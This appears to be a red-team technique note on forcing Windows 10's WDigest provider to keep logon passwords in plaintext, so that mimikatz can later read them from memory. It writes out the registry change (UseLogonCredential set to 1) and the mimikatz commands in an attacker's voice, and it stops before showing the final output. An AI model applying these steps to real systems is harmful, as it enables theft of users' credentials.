# Forcing WDigest to Store Credentials in Plaintext

As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer  Windows versions.&#x20;

It is still possible, however, to force WDigest to store secrets in plaintext.

## Execution

Let's first make sure that wdigest is not storing credentials in plaintext on our target machine running Windows 10:

{% code title="attacker@victim" %}
```csharp
sekurlsa::wdigest
```
{% endcode %}

Note the password field is null:

![](<../../.gitbook/assets/mimikatz 2.2.0 x64 (oe.eo) 5\_13\_2019 10\_42\_39 PM.png>)

Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:

{% code title="attacker@victim" %}
```csharp
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
{% endcode %}

![](<../../.gitbook/assets/mimikatz 2.2.0 x64 (oe.eo) 5\_13\_2019 10\_44\_54 PM.png>)

Say, now the victim on the target system spawned another shell:

{% code title="victim@local" %}
```csharp
runas /user:mantvydas powershell
```
{% endcode %}

Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user `mantvydas`:
